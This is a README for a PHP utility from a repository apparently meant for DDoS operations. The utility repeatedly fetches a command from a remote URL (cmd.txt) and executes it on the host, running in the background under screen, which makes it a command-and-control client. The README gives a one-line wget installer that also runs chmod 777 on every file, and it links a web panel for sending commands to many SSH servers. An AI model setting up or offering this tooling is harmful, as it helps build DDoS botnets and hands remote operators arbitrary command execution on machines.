
# Read Command from URL and Execute on SSH Terminal ↓

## Features

- Fast execution
- Customize delay between the last command executed or to read new one
- Basic PHP script



## Installation

One Line Setup for Debian Based distro ~ Ubuntu, Debian

```bash
  apt update -y && apt install php -y && apt install wget -y && wget https://raw.githubusercontent.com/cyberceros/ddos-dose/main/Utility%20Scripts%20for%20DDoS/Read%20Command%20from%20URL%20and%20Execute%20on%20SSH%20Terminal/read.php && chmod 777 *
```
## Usage

```
Recommended to Execute this script under screen command.
So it's will run on backgroup and keep checking for command on URL
```
```
screen -d -m php read.php
```
```
To customize the URL from where the script read for command (Line 10)
    $GetCmd = file_get_contents("https://nee.dultr.in/cmd.txt");
Change the URL between ""    
```
```
When the Last command executed on Terminal and finish execution and then the script
how much time after will check for a new command on the web url, You can Customize that
in (line 16) 
---> sleep(30); | This is in seconds, you can customize, minimum suggest: 5-10 seconds.  
```
## For writing the Command to "cmd.txt" file, a php web script

Check this folder of repo, You can use this to write command to "cmd.txt" using web interface!

[Click Here for that Script](https://github.com/cyberceros/ddos-dose/tree/main/Utility%20Scripts%20for%20DDoS/API%20to%20Send%20Command%20to%20Multiple%20SSH)


## Authors

- [@cyberceros](https://www.github.com/cyberceros)
## Feedback

If you have any feedback, please reach out to us at n@dultr.in
